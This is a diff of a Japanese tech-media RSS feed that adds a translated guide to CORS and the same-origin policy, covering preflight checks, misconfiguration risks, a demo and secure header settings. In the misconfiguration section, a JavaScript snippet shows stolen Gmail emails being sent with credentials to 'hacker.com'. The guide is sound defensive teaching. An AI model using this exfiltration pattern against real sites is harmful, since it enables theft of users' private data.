@@ -1,4 +1,212 @@
-<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title><![CDATA[POSTD | ニジボックスが運営するエンジニアに向けたキュレーションメディア]]></title><description><![CDATA[POSTD は、ニジボックスが運営する、エンジニアに向けたキュレーションメディアです。ニジボックスはWebサービスの企画、制作、開発、運用を一貫して担うリクルートの100%子会社です。 リクルートグループのオンラインサービスをはじめ、様々な業種・業界・業態のサービス開発を行っております。]]></description><link>https://postd.cc</link><generator>GatsbyJS</generator><lastBuildDate>Thu, 12 Dec 2024 02:05:37 GMT</lastBuildDate><language>ja</language><atom:link href="https://postd.cc/feed/" rel="self" type="application/rss+xml"/><image><title>POSTD | ニジボックスが運営するエンジニアに向けたキュレーションメディア</title><link>https://postd.cc</link></image><item><title><![CDATA[進化した正規表現：JavaScriptの正規表現の歴史と未来]]></title><description><![CDATA[クイックサマリー：以前は、JavaScriptの正規表現は他の言語の正規表現に比べてパフォーマンスが劣っていたものの、近年改良が重ねられ、他の言語に見劣りしなくなっています。この記事では、Steve…]]></description><link>https://postd.cc/history-future-regular-expressions-javascript/</link><guid isPermaLink="false">https://postd.cc/history-future-regular-expressions-javascript/</guid><category><![CDATA[開発手法・プロジェクト管理]]></category><category><![CDATA[JavaScript]]></category><category><![CDATA[正規表現]]></category><pubDate>Thu, 12 Dec 2024 00:00:01 GMT</pubDate><content:encoded><![CDATA[<p><strong>クイックサマリー</strong>：以前は、JavaScriptの正規表現は他の言語の正規表現に比べてパフォーマンスが劣っていたものの、近年改良が重ねられ、他の言語に見劣りしなくなっています。この記事では、Steven Levithan氏がJavaScriptの正規表現の歴史と現状を評価し、より読みやすく、保守性とレジリエンスに優れた正規表現の書き方をアドバイスします。</p>
+<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title><![CDATA[POSTD | ニジボックスが運営するエンジニアに向けたキュレーションメディア]]></title><description><![CDATA[POSTD は、ニジボックスが運営する、エンジニアに向けたキュレーションメディアです。ニジボックスはWebサービスの企画、制作、開発、運用を一貫して担うリクルートの100%子会社です。 リクルートグループのオンラインサービスをはじめ、様々な業種・業界・業態のサービス開発を行っております。]]></description><link>https://postd.cc</link><generator>GatsbyJS</generator><lastBuildDate>Fri, 24 Jan 2025 02:29:33 GMT</lastBuildDate><language>ja</language><atom:link href="https://postd.cc/feed/" rel="self" type="application/rss+xml"/><image><title>POSTD | ニジボックスが運営するエンジニアに向けたキュレーションメディア</title><link>https://postd.cc</link></image><item><title><![CDATA[CORSガイドの決定版]]></title><description><![CDATA[無垢な仔猫の写真を集めたウェブサイトを訪問したと想像してみてください。かわいい仔猫達の写真の背後には、このウェブサイトの強大な力が隠れています。誰かがウェブサイトにアクセスすると、サイトのオーナーは…]]></description><link>https://postd.cc/cors-the-ultimate-guide/</link><guid isPermaLink="false">https://postd.cc/cors-the-ultimate-guide/</guid><category><![CDATA[開発手法・プロジェクト管理]]></category><category><![CDATA[CORS]]></category><category><![CDATA[Ajax]]></category><pubDate>Fri, 24 Jan 2025 00:00:01 GMT</pubDate><content:encoded><![CDATA[<p>無垢な仔猫の写真を集めたウェブサイトを訪問したと想像してみてください。かわいい仔猫達の写真の背後には、このウェブサイトの強大な力が隠れています。誰かがウェブサイトにアクセスすると、サイトのオーナーはその訪問者のネット上の行動に関するあらゆる情報を入手できます。その中には、銀行取引情報、SNS上の投稿やメッセージ、メール、オンラインの購買データなどが含まれます。あなたが受ける信用面や金銭面の損害はどれほどのものになるでしょうか。あなたのメッセージが流出し、銀行口座のお金が使い込まれるかもしれません。しかし幸いなことに、実際にはそのような状況は起こりません。それは、<a href="https://en.wikipedia.org/wiki/Same-origin_policy">SOP</a>とCORSのお陰なのです。</p>
+<h3>目次</h3>
+<ol>
+<li>Ajax（Asynchronous JavaScript And XML）</li>
+<li>インターネットがジャングルではない理由</li>
+<li>認証情報を「含める」vs「含めない」</li>
+<li>CORSルールの定義</li>
+<li>クロスオリジンリクエストの処理
+<ol>
+<li>リクエストするか否か</li>
+<li>アクセスを許可するか拒否するか</li>
+<li>CORSポリシーのチェック</li>
+</ol>
+</li>
+<li>CORSポリシーの誤設定による危険</li>
+<li>デモ</li>
+<li>安全なCORSポリシーを定義する方法</li>
+<li>CSRF対策としてのCORS設定</li>
+<li>設定ミスで墓穴を掘らない</li>
+</ol>
+<h2>Ajax（Asynchronous JavaScript And XML）</h2>
+<p>少し前の技術になりますが、皆さんがよくご存知の<a href="https://en.wikipedia.org/wiki/Ajax_(programming)">Ajax</a>についてまずお話します。Ajaxとは、ブラウザがバックグラウンドでリクエストを送信できるようにするためのJavaScriptの仕組みです。ウェブサイトのクライアントサイドアプリケーションでは、一般的にAjaxを使用してAPIサーバーに情報をリクエストします。Ajaxはクライアント側で実行されます。つまり、ユーザーがウェブサイトにアクセスする際、ブラウザがAjaxリクエストを送信するということです。この記事では、ボブという名前のインターネットユーザーの事例を検討してみましょう。</p>
+<p>example.comというウェブサイトにリクエストを送信する際、Ajaxに「認証情報を使用する」よう伝えることができます。この場合、ブラウザはボブが<code class="language-text">example.com</code>に関するCookieを保存しているかチェックします。保存している場合、ブラウザはAjaxリクエストによりCookieを送信します。ボブがexample.com上で認証されれば、ウェブサイトはボブを認識します。ブラウザはボブのIDでAjaxリクエストを送信します。
+<img src="https://www.devsecurely.com/blog/wp-content/uploads/2024/06/exported_image-1-1024x350.png"></p>
+<h2>インターネットがジャングルではない理由</h2>
+<p>あなたがサイバーセキュリティに熱心であれば、ある疑問が思い浮かんだかもしれません。すなわち、もし自分が悪意のあるウェブサイトを作成したならば、認証情報を<strong>含めて</strong>GmailのウェブサイトにAjaxリクエストを送信し、訪問者のメールをすべて取得すればよいのではないか、という疑問です。</p>
+<p>この疑問が浮かんだ方は、悪の才能があるかもしれません。ですが、その企みはうまく行きません。<strong>SOP</strong>と<strong>CORS</strong>という2つの仕組みがあるからです。</p>
+<p>SOPはSame Origin Policyの略で、「同一オリジンポリシー」という意味です。この仕組みは、ウェブサイトAがオリジンの異なるウェブサイトBのリソースを読み込めないようにするものです。SOPは、ウェブサイトとサイト上に保存されたユーザーのデータが、悪意のあるウェブサイトによってアクセスされないよう保護します。</p>
+<p>CORSはCross-Origin Resource Sharingの略で、「オリジン間リソース共有」という意味です。CORSは、SOPの仕組みに例外を追加できる一連のルールです。SOPのポリシーを緩めることで、ウェブサイトAがオリジンの異なるウェブサイトBからリソースを読み込めるようにします。</p>
+<p>ウェブサイトのオリジンは、ドメイン、プロトコルスキーム、ネットワークポートの組み合わせです。2つのURLの間でこれらのいずれかが異なる場合、ブラウザはオリジンが異なるとみなします。<a href="https://www.devsecurely.com/">https://www.devsecurely.com/</a>を例に見てみましょう。このウェブサイトが以下のいずれかのウェブサイトにAjaxリクエストを送信した場合、ブラウザはクロスオリジン（異なるオリジン）とみなします。</p>
+<ul>
+  <li><span style="color: red; font-weight: bold;">http</span>://www.devsecurely.com/</li>
+  <li>https://<span style="color: red; font-weight: bold;">api</span>.devsecurely.com/</li>
+  <li>https://www.<span style="color: red; font-weight: bold;">gmail</span>.com/</li>
+  <li>https://www.devsecurely.com:<span style="color: red; font-weight: bold;">8443</span>/</li>
+</ul>
+<p>ウェブサイトがオリジンの異なるURLにHTTPリクエストを送信した場合、このリクエストは<strong>クロスオリジンリクエスト</strong>とみなされます。<strong>同一オリジンリクエスト</strong>とは扱いが異なります。クロスオリジンリクエストの扱い方に関するルールは複雑です。この記事では、すべての要素とルールを見ていきます。準備はいいですか？</p>
+<h2>認証情報を「含める」vs「含めない」</h2>
+<p>まずは認証情報を使用するか否かでAjaxリクエストにどのような影響があるのか見てみましょう。明確化のため、<code class="language-text">https://hacker.com</code>から<code class="language-text">https://gmail.com</code>にAjaxリクエストを送信する例について検討します。</p>
+<p>「認証情報を含める」は、Ajaxで有効化できるオプションです。ブラウザに対し、Gmail上のユーザーのCookieをAjaxリクエストに含めるよう指示します。そうすることで、Gmailはボブのブラウザから送られたリクエストであると分かります。レスポンスには、ボブのGmailアカウントに関連する情報が含まれます。例えば、<code class="language-text">https://gmail.com/emails</code>に対してAjaxリクエストを送ると、レスポンスにはボブのメールが含まれます。</p>
+<p>これは危険なシナリオです。どのウェブサイトでもAjaxリクエストを送ることで訪問者のメールを取得することが出来たなら、インターネットは野生のジャングルのようになってしまうでしょう。インターネットプロトコルを設計したエンジニアたちが、そうならないようにしたのです。</p>
+<p>一方で、「認証情報を含める」を有効化しなかった場合、AjaxリクエストにはCookieは含まれません。Gmailのウェブサイトは、ボブが別のブラウザタブでGmailアカウントにログインしていたとしても、ボブのブラウザを匿名のユーザーとして扱います。したがって、Ajaxリクエストに対するレスポンスには、一切個人情報は含まれません。</p>
+<h2>CORSルールの定義</h2>
+<p>ブラウザは、ウェブサイトAからウェブサイトBにAjaxリクエストを送る際、ウェブサイトBのCORSルールを参照し、どのように振る舞うかを判断します。ブラウザが従うCORSルールを定義するのはウェブサーバーBです。これらのルールは、特定のHTTPレスポンスヘッダー内で定義されます。最も重要なヘッダーは<strong>Access-Control-Allow-Origin</strong>と<strong>Access-Control-Allow-Credentials</strong>です。それぞれの役割と取り得る値については後ほど説明します。</p>
+<h2>クロスオリジンリクエストの処理</h2>
+<p>あるウェブサイトが別のウェブサイトにAjaxリクエストを行った場合（クロスオリジンリクエスト）、ブラウザはCORSポリシーを確認し、Ajaxリクエストの扱い方を判断します。
+ブラウザは次の2つについて判断する必要があります。</p>
+<ol>
+<li>JavaScriptコードで定義されているようにHTTPリクエストを行うべきか？</li>
+<li>ブラウザがリクエストを行った場合、JavaScriptコードがレスポンスにアクセスできるようにするべきか？
+これら2つのステップを掘り下げて見てみましょう。</li>
+</ol>
+<h2>リクエストするか否か</h2>
+<p>一部のAjaxの設定の仕方によっては、、ブラウザはCORSポリシーをチェックせずにリクエストを行います。そうでない場合は、ブラウザはCORSポリシーをチェックした上でリクエストを行うか否かを判断する必要があります。後者の場合、ブラウザはまずHTTP OPTIONSリクエストをURLに対して行い、CORSポリシーを取得します。これをプリフライトリクエストと言います。</p>
+<p>ブラウザがどのようにしてCORSポリシーチェックを行うかは後ほど説明します。ここでは、<a href="https://en.wikipedia.org/wiki/Cross-origin_resource_sharing">ウィキペディア</a>にある以下のデシジョンツリー（決定木）を見てみましょう。ブラウザがリクエストを行う前にCORSポリシーをチェックする際の条件が説明されています。
+<img src="https://www.devsecurely.com/blog/wp-content/uploads/2024/06/CORS.png">
+CORSチェックなしでブラウザがリクエストを行う条件を以下に挙げます。</p>
+<ul>
+<li>AjaxリクエストがGETリクエストであり、カスタムHTTPヘッダーがない。</li>
+<li>AjaxリクエストがPOSTリクエストであり、標準のContent-Typeで、カスタムHTTPヘッダーがない。</li>
+</ul>
+<p>ブラウザはなぜCORSポリシーをチェックせずにこれらのリクエストを行うのでしょうか。それは、これらがAjaxを使わずにウェブサイトが実行できるリクエストだからです。</p>
+<ul>
+<li>カスタムHTTPヘッダーのないGETリクエストは、HTMLのimgタグまたはiframeタグを使用してトリガーできます。src属性の中でターゲットURLを宣言するだけです。ページをレンダリングする際、ブラウザがURLに対して認証情報を含むGETリクエストを行い、リソースを読み込みます。</li>
+<li>HTMLのformタグを使用し、カスタムHTTPヘッダーなしで、標準のContent-TypeによりPOSTリクエストをトリガーできます。POST属性はすべてHTMLのinputタグを使用して追加でき、JavaScriptを使用してフォームを送信し、リクエストを実行できます。</li>
+</ul>
+<p>他のすべてのシナリオでは、ブラウザはプリフライトリクエストを行います。次にCORSポリシーをチェックし、リクエストを送信するか判断します。</p>
+<ul>
+<li>HTTPのPUT、DELETEまたはその他のリクエスト</li>
+<li>HTTPのPOSTリクエストで、application/jsonなど標準以外のContent-Typeを使用</li>
+<li>HTTPのGETまたはPOSTリクエストで、X-Requested-With: XMLHttpRequestなどのカスタムHTTPヘッダーを使用</li>
+</ul>
+<h2>アクセスを許可するか拒否するか</h2>
+<p>ブラウザは、Ajaxリクエストを行う場合、JavaScriptコードがレスポンスにアクセスできるようにするか判断する必要があります。ブラウザはレスポンスからCORSポリシーを取得し、AjaxリクエストがCORSポリシーと一致するか確認します。
+一致する場合、JavaScriptコードはレスポンスにアクセスできます。一致しない場合、JavaScriptコードはレスポンスにアクセスできず、JavaScriptコンソールにエラーメッセージが表示されます。
+次のセクションでは、CORSポリシーのチェックプロセスについて説明します。</p>
+<h2>CORSポリシーのチェック</h2>
+<p>要約すると、ブラウザは以下の2つのケースでCORSポリシーをチェックします。</p>
+<ol>
+<li>標準以外のHTTPリクエストを送信する前。</li>
+<li>レスポンスへのアクセスを許可するかどうか判断する前。</li>
+</ol>
+<p>ブラウザは以下の要素をチェックします。</p>
+<ul>
+<li>ブラウザは<strong>Access-Control-Allow-Origin</strong>レスポンスヘッダーの値を取得します。値はAjaxリクエストを行ったウェブサイトのオリジンと一致しなくてはいけません。オリジンの形式は「schema://fqdn:port」です。
+<ul>
+<li><strong>Access-Control-Allow-Origin</strong>レスポンスヘッダーがない場合、チェックは失敗します。</li>
+<li>実は、<strong>Access-Control-Allow-Origin</strong>ヘッダーにワイルドカード文字の「*」が指定されている場合もチェックは失敗します。</li>
+</ul>
+</li>
+<li>「認証情報を含めて」リクエストを行う場合： <strong>Access-Control-Allow-Credentials</strong>レスポンスヘッダーがあり、値は「true」が設定されている必要があります。</li>
+<li>カスタムHTTPヘッダーを1つ以上設定してAjaxリクエストを行う場合：ブラウザは<strong>Access-Control-Allow-Headers</strong>レスポンスヘッダーの値を取得します。このヘッダーの値には、リクエストで使用されたカスタムHTTPヘッダーがすべて含まれている必要があります。</li>
+<li>AjaxリクエストタイプがGET、POST、HEADのいずれでもない場合：ブラウザは<strong>Access-Control-Allow-Methods</strong>レスポンスヘッダーの値を取得します。値には、Ajaxクエリによって定義されたHTTPリクエストタイプが含まれている必要があります。</li>
+</ul>
+<p>これらの条件のいずれかが満たされていない場合、CORSポリシーのチェック全体が失敗して以下の結果となります。
+ブラウザがリクエストを行う前にCORSチェックを実行する場合、リクエストを送信しません。
+ブラウザがリクエストを行った後でCORSチェックを実行する場合、JavaScriptコードはレスポンスにアクセスできません。</p>
+<p>以下の図はCORSのデシジョンツリーをまとめたものです。
+<img src="https://www.devsecurely.com/blog/wp-content/uploads/2024/07/recap3-1024x623.png"></p>
+<div class="twitter_follow"><span>セキュリティを万全に保ちたい方は、筆者らのXで役に立つ情報やセキュリティニュースのダイジェストを提供しているのでぜひフォローしてください</span><br/><a href="https://twitter.com/devsecurely?ref_src=twsrc%5Etfw" class="twitter-follow-button" data-show-count="false">Follow @Devsecurely</a><script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script><style type="text/css" scoped>.twitter_follow span{font-size:17px;color:#000}.twitter_follow{text-align:center;--style-box-shadow-style-type: ;--style-box-shadow-distance-x:0px;--style-box-shadow-distance-y:0px;--style-box-shadow-blur:36px;--style-box-shadow-spread:4px;--style-box-shadow-color:rgb(0, 0, 0, 0.12);box-shadow:var(--style-box-shadow-style-type) var(--style-box-shadow-distance-x) var(--style-box-shadow-distance-y) var(--style-box-shadow-blur) var(--style-box-shadow-spread) var(--style-box-shadow-color);padding:8px 12px;border-radius:10px;border:1px solid #e7e7e7;background-color:#c0708c4a}.twitter_follow iframe{margin-top:10px}</style></div>
+<h2>CORSポリシーの誤設定による危険</h2>
+<p>ブラウザのメンテナーがユーザーを保護するためにCORSの仕組みを設計しました。ユーザーがうっかり悪意のあるウェブサイトにアクセスしてしまうかもしれないからです。優れたCORSポリシーは、悪意のあるウェブサイトがユーザーのIDを使ってあなたのウェブサイトにHTTPリクエストを送信できないようにします。</p>
+<p>CORSポリシーは、HTTPレスポンスヘッダーを用いて定義されます。したがって、デベロッパーには他のオリジンからの悪意のあるリクエストを防ぐことができる、十分厳格なCORSポリシーを定義することが求められます。</p>
+<p>CORSは、Cookie（セッションCookieなど）を使用してユーザー認証を行うウェブサイトに特に関係します。これは、「認証情報を含める」Ajax設定の場合、ブラウザが自動的にCookieをリクエストとともに送信するからです。そうすると、リクエストは正当なユーザーから届いたように見えます。</p>
+<p>では、他の認証方法を使用する場合はどうでしょうか。例えば、HTTPの「Authorization」ヘッダーで認証トークンを送信するとします。その場合、CORSポリシーはあまり関係ありません。悪意のあるウェブサイトがAjaxリクエストを行っても、ブラウザはリクエストにトークンを追加しません。そのため、悪意のあるウェブサイトは正規のウェブサイトのローカルストレージにアクセスできません。トークンにアクセスできないため、Ajaxのリクエストに含めることができません。あなたのウェブサイトは、何もせずともこの攻撃シナリオからは保護されます。</p>
+<p>Cookieによる認証の場合、CORSポリシーが甘いと悪いことが起こる可能性があります。ユーザーが悪意のあるウェブサイトにアクセスした際、以下のような攻撃シナリオが考えられます。</p>
+<ul>
+<li>悪意のあるウェブサイトがAjaxリクエストを行い、Gmail上のユーザーのメールを取得します。次にJavaScriptコードがそれらのメールをウェブサイトを作成したハッカーに送ります。</li>
+<li>悪意のあるウェブサイトは、Gmailに対して特定のHTTP POSTリクエストを行うことができます。このリクエストはユーザーの設定を変え、ハッカーが被害者であるユーザーの名前でメールを送信できるようにします。
+悪意のあるウェブサイトは、Gmailに対して特定のHTTP POSTリクエストを行い、被害者のパスワードを変更することができます。</li>
+</ul>
+<p>以下のJavaScriptコードのスニペットは、攻撃者がどのようにして被害者のメールを取得し、自分のサーバーに送信するのかを示します。取得したメールはサーバーに保存し、後で参照することができます。</p>
+<div class="gatsby-highlight" data-language="jsx"><pre style="counter-reset: linenumber NaN" class="language-jsx line-numbers"><code class="language-jsx"><span class="token keyword">var</span> xhr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+xhr<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span> <span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'https://gmail.com/emails'</span><span class="token punctuation">)</span>
+xhr<span class="token punctuation">.</span>withCredentials <span class="token operator">=</span> <span class="token boolean">true</span>
+xhr<span class="token punctuation">.</span><span class="token function-variable function">onreadystatechange</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>readyState <span class="token operator">==</span> <span class="token number">4</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">this</span><span class="token punctuation">.</span>status <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+<span class="token keyword">var</span> xhr2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+xhr2<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span> <span class="token string">'POST'</span><span class="token punctuation">,</span> <span class="token string">'https://hacker.com/save_emails'</span><span class="token punctuation">)</span>
+<span class="token keyword">var</span> params <span class="token operator">=</span> <span class="token string">'emails='</span><span class="token operator">+</span>xhttp<span class="token punctuation">.</span>responseText<span class="token punctuation">;</span>
+xhr2<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>params<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span class="token punctuation">;</span>
+xhr<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
+<p>以下はこのシナリオをイラストで表したものです。
+<img src="https://www.devsecurely.com/blog/wp-content/uploads/2024/06/exported_image2-1024x341.png">
+ここで紹介した例は単に説明を目的としたものです。Gmailにはそのような攻撃を防ぐ優れたCORSポリシーがあります。実際に効果を見ていただけるよう、例としてウェブサイトを作成してみました。</p>
+<h2>デモ</h2>
+<p>この攻撃について説明するため、シンプルで脆弱なウェブサイトを作成しました。このデモサイトは、認証が必要なウェブアプリケーションをシミュレーションします。まず、次のURLにアクセスし、ボタンをクリックしてログインしてください。<a href="https://demo.devsecurely.com/demo_cors">https://demo.devsecurely.com/demo_cors</a></p>
+<p>ログインしたら、以下のボタンをクリックしてください。先ほどのURLに対し、認証情報を含めたAjaxリクエストが送信されます。</p>
+<p>(※訳注：POSTDでは文章の翻訳のみ掲載しています)</p>
+<p>[原文：「攻撃開始」ボタン]</p>
+<p>Ajaxリクエストの結果が以下に表示されます。</p>
+<p>[原文：結果表示エリア]</p>
+<p>手順に従うと、あなたのパブリックIPアドレスが上に表示されるはずです。「攻撃開始」ボタンをクリックしたとき、あなたのブラウザは以下のJavaScriptコードを実行しました。</p>
+<div class="gatsby-highlight" data-language="jsx"><pre style="counter-reset: linenumber NaN" class="language-jsx line-numbers"><code class="language-jsx"><span class="token keyword">var</span> xhttp <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+xhttp<span class="token punctuation">.</span><span class="token function-variable function">onreadystatechange</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>readyState <span class="token operator">==</span> <span class="token number">4</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">this</span><span class="token punctuation">.</span>status <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>responseText<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">"Your IP address"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"demo_website_dontent"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>textContent<span class="token operator">=</span><span class="token keyword">this</span><span class="token punctuation">.</span>responseText
+<span class="token keyword">else</span>
+document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"demo_website_dontent"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>textContent<span class="token operator">=</span><span class="token string">"You need to be authenticated first"</span>
+<span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span class="token punctuation">;</span>
+xhttp<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"GET"</span><span class="token punctuation">,</span> <span class="token string">"https://demo.devsecurely.com/demo_cors"</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+xhttp<span class="token punctuation">.</span>withCredentials <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
+xhttp<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
+<p>あなたのブラウザは、HTTPリクエストを直接実行するか、プリフライトリクエストを実行し、CORSポリシーをチェックするかを判断する必要がありました。これは単純なGETリクエストで、カスタムHTTPヘッダーもないのでブラウザは直接リクエストを行いました。こちらが、あなたのブラウザが送信した生のHTTPリクエストです。</p>
+<p><img src="https://www.devsecurely.com/blog/wp-content/uploads/2024/06/request1.png"></p>
+<p>これに対し、脆弱なウェブサイトは以下のレスポンスを送り返しました。</p>
+<p><img src="https://www.devsecurely.com/blog/wp-content/uploads/2024/06/response1.png"></p>
+<p>次に、ブラウザはJavaScriptコードがレスポンスにアクセスできるようにするかを判断する必要がありました。したがって、CORSポリシーのチェックを行いました。4つの条件をすべて見てみましょう。</p>
+<ul>
+<li>Access-Control-Allow-Originヘッダーの値には「 <a href="https://www.devsecurely.com">https://www.devsecurely.com</a> 」が設定されています。これは、Ajaxリクエストを行ったのと同じオリジンです。✅</li>
+<li>リクエストは認証情報ありで行い、レスポンスにはAccess-Control-Allow-Credentialsヘッダーが存在し、値は「true」です。✅</li>
+<li>リクエストはカスタムHTTPヘッダーを使用していません。そのため、ブラウザはAccess-Control-Allow-Headersヘッダーをチェックしません。✅</li>
+<li>リクエストはGETリクエストを実行します。そのため、ブラウザはAccess-Control-Allow-Methodsヘッダーをチェックしません。✅</li>
+</ul>
+<p>CORSのチェックはすべて成功しました。したがって、ブラウザはJavaScriptがレスポンスにアクセスするのを許可します。これにより、このブログが脆弱なウェブサイト上にあるあなたの個人データにアクセスすることが可能になります。</p>
+<h2>安全なCORSポリシーを定義する方法</h2>
+<p>CORSポリシーは、特定のHTTPレスポンスヘッダーによって定義されます。各ヘッダーについて、値が十分に厳格であり、悪意のある活動を防げることを確認する必要があります。また、ポリシーが正当なリクエストをブロックしないようにする必要もあります。各レスポンスヘッダーの値を定義しましょう。</p>
+<ul>
+<li><strong>Access-Control-Allow-Origin</strong>：このヘッダーの値は、ウェブサイトの呼び出しを許可されたオリジンでなくてはいけません。例えば、<code class="language-text">https://api.example.com</code>にホストされたAPIがあり、そのAPIを呼び出す、<code class="language-text">https://www.example.com</code>にホストされたクライアントサイドアプリケーションがあるとします。このシナリオでは、<strong>Access-Control-Allow-Origin</strong>ヘッダーには常に<code class="language-text">https://www.example.com</code>が値として設定されている必要があります。
+<ul>
+<li>複数のウェブサイトがあなたのウェブサイトを呼び出せるようにする必要がある場合、許可されたウェブサイトのホワイトリストを定義する必要があります。すべてのリクエストに対して、<strong>Origin</strong>リクエストヘッダーにホワイトリスト上のオリジンが含まれているかどうか確認します。
+<ul>
+<li>含まれている場合、<strong>Origin</strong>リクエストヘッダーの値を<strong>Access-Control-Allow-Origin</strong>レスポンスヘッダーの値として返します。</li>
+<li>含まれていない場合、<strong>Access-Control-Allow-Origin</strong>ヘッダーのデフォルト値を返します。</li>
+</ul>
+</li>
+<li>他のオリジンがあなたのウェブサイトを呼び出せるべきでない場合（例えば、ウェブサイト全体が<code class="language-text">https://www.example.com</code>にホストされている場合など）、このヘッダーは定義しません。</li>
+</ul>
+</li>
+<li><strong>Access-Control-Allow-Credentials</strong>：あなたのウェブサイトがCookie（セッションCookieなど）を使用してユーザーを認証する場合、このヘッダーの値は「true」に設定します。
+<ul>
+<li>他のオリジンがあなたのウェブサイトを呼び出せるべきでない場合、このヘッダーは定義しません。</li>
+</ul>
+</li>
+<li><strong>Access-Control-Allow-Headers</strong>：リクエストにカスタムHTTPヘッダーを含める必要がある場合、このレスポンスヘッダーに追加してください。複数のHTTPヘッダーが必要な場合、カンマ区切りリストとして追加してください。
+<ul>
+<li>他のオリジンがあなたのウェブサイトを呼び出せるべきでない場合、このヘッダーは定義しません。</li>
+</ul>
+</li>
+<li><strong>Access-Control-Allow-Methods</strong>：<strong>あなたのウェブサイトがPUTまたはDELETE HTTPメソッドを扱う場合、このヘッダーにカンマ区切りリストとして追加してください</strong>。
+<ul>
+<li>他のオリジンがあなたのウェブサイトを呼び出せるべきでない場合、このヘッダーは定義しません。</li>
+</ul>
+</li>
+</ul>
+<p>プリフライトリクエスト（HTTP OPTIONSリクエスト）を受け取った場合、レスポンスヘッダーのみを返し、それ以外の処理は行わないようにする必要があります。</p>
+<p>また、これらの変更は徐々に行ってください。各変更を行った後、ウェブサイトが正常に動作していることを確認してください。CORSの設定を厳しくしすぎると、あなたのAPI／ウェブサイト（ウェブサイトのクライアントサイドアプリケーションなど）を呼び出すクライアント側で問題が発生する可能性があります。</p>
+<h2>CSRF対策としてのCORS設定</h2>
+<p>先ほど説明したように、ブラウザはCORSポリシーをチェックすることなくリクエストを実行する場合があります。これは、アプリケーションのコンテキストによっては望ましくない可能性があります。</p>
+<p>例えば、データを変更するGET APIコントローラーがあるとします。これは、CSRFと呼ばれる攻撃につながる可能性があります。この記事では、このタイプの脆弱性についての詳細な説明は省きますが、この問題についてより具体的に検討するために例を挙げたいと思います。</p>
+<p>APIエンドポイントとして<code class="language-text">https://api.example.com/users/delete/[ID]</code>があるとします。このエンドポイントに対してGETリクエストを行うと、[ID]をIDとするユーザーがデータベースから削除されます。悪意のあるウェブサイトはこれを悪用する可能性があります。先ほどのURLに対し、認証情報を含めたAjaxリクエストを行うことができます。<code class="language-text">example.com</code>の管理者がその悪意のあるウェブサイトにアクセスすると、Ajaxリクエストが実行され、ユーザーが削除されます。</p>
+<p>こうした攻撃を防ぐための回避策として、CORSチェックを使用できます。そのためには、<strong>リクエストを行う前に</strong>CORSチェックを強制する必要があります。GETリクエストの場合、それを行う唯一の方法はカスタムHTTPヘッダーを追加することです。以下に手順を示します。</p>
+<ol>
+<li>クライアントサイドアプリケーションで、該当するリクエストにカスタムHTTPヘッダーを追加します（あなたのAPIに対して行われるすべてのリクエストにこのヘッダーを追加してもいいかもしれません）。ヘッダーの名前と値は任意で構いません。ここでは例として「X-Requested-With: XMLHttpRequest」をヘッダーとします。</li>
+<li>API側では、新しいヘッダー（X-Requested-With）が各リクエストに存在することを必ず確認するような設定にします。存在しない場合はリクエストを中断し、エラーメッセージを返します。</li>
+</ol>
